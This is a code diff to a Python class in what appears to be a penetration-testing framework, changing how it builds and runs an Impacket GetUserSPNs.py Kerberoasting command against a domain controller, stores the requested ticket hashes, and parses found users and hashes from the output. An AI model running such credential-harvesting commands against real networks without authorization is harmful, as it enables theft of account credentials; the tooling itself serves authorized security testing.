@@ -622,7 +622,9 @@ class Tool:
             return False
 
         safe_user = re.sub(r"[^A-Za-z0-9._-]", "_", self.auth.username.lower())
-        safe_target = re.sub(r"[^A-Za-z0-9._-]", "_", target_account.lower())
+        safe_target = re.sub(
+            r"[^A-Za-z0-9._-]", "_", (target_account or "").lower()
+        )
         output_file = Path(self.module.logs_dir) / (
             f"kerberoast_{safe_user}" + (f"_{safe_target}" if safe_target else "") + ".txt"
         )
@@ -631,23 +633,26 @@ class Tool:
         account_param = (
             ["-request-user", target_account] if target_account != "" else []
         )
-        command_parts = (
-            [
-                "../tools/.bin/GetUserSPNs.py",
-                "-request",
-                "-outputfile",
-                str(output_file),
-                "-target-domain",
-                self.opts.domain,
-                "-dc-ip",
-                self.opts.dc_ip,
-            ]
-            + account_param
-            + auth_params
-        )
+        command_parts = [
+            "GetUserSPNs.py",
+            "-request",
+            "-outputfile",
+            str(output_file),
+            "-target-domain",
+            self.opts.domain,
+        ]
+
+        if getattr(self.opts, "dc_ip", ""):
+            command_parts += ["-dc-ip", self.opts.dc_ip]
+
+        dc_host = (getattr(self.opts, "dc_host", "") or getattr(self.opts, "dc_hostname", "")).strip()
+        if dc_host:
+            command_parts += ["-dc-host", dc_host]
+
+        command_parts += account_param + auth_params
 
         if self.auth.auth == "krb":
-            command_parts += [self.opts.domain + "/"]
+            command_parts += [f"{self.auth.domain}/{self.auth.username}"]
 
         async for line in self.run_command(shlex.join(command_parts), self.output_pane):
             self.output_pane.write(line)
@@ -1000,7 +1005,7 @@ class Tool:
                 tab = line.replace(":", " ").strip().split()
                 self.found_user, self.found_domain = tab[4].strip("'").split("@")
                 self.found_hash = tab[-1]
-                line = f"[yellow]{line}[/yellow]"
+                line = f"[green]{line}[/green]"
             self.output_pane.write(line)
 
         if success:
